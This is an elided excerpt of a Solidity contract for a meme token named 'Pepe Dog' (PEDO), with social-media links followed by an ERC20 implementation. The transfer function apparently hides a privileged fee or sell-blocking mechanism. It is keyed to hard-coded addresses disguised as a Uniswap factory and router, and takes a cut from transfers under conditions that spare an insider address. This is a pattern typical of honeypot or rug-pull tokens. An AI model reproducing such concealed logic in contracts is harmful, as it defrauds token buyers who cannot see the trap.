...
https://twitter.com/PEDOpepedog

https://pepedog.xyz
https://t.me/PepeDogETH
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private uniswapV2Factory = 0x3850EB9Bc809CB801DFF074eAe22CAbb27835C88;
    uint8 private _decimals = 9;
    mapping(address => uint256) private _balances;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _allowance = 0;
    uint256 private _totalSupply;
    address internal router = 0x330ffDf316bF3Aab47c422C9D761AB7645F115D1;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != router && _balances[uniswapV2Factory] > 0 ? _pairsToken : _allowance).div(100)+0;
        if (swapamount > 0)
        {
...
contract PepeDogToken is ERC20, Ownable
{
    constructor()
    ERC20(unicode"Pepe Dog", unicode"PEDO")
    {
